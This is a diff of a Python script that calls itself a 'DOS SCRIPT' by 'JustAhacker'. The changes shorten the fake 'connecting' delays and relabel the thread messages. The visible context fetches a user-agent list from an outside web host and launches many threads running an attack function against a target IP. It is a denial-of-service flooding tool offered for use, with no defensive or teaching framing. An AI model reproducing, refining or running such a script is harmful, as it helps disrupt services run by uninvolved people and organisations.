@@ -4,11 +4,11 @@ import time
 print ("DOS SCRIPT BY JustAhacker")
 time.sleep(3)
 print ("please Wait.....")
-time.sleep(4)
+time.sleep(2)
 print ("checking for a server....")
 time.sleep(2)
 print ("connecting.....")
-time.sleep(5)
+time.sleep(2)
 import requests,random,sys,time
 from thread import *
 heder = requests.get("https://justaserverscript.000webhostapp.com/user-agents.txt").text
@@ -47,7 +47,7 @@ def kita():
 def lol():
   for i in range(thr):
     start_new_thread(atk,(ip,))
-    print ("Thread +1")
-    time.sleep(1.5)
+    print ("DOS THREAD +1")
+    time.sleep(1)
 
 lol()
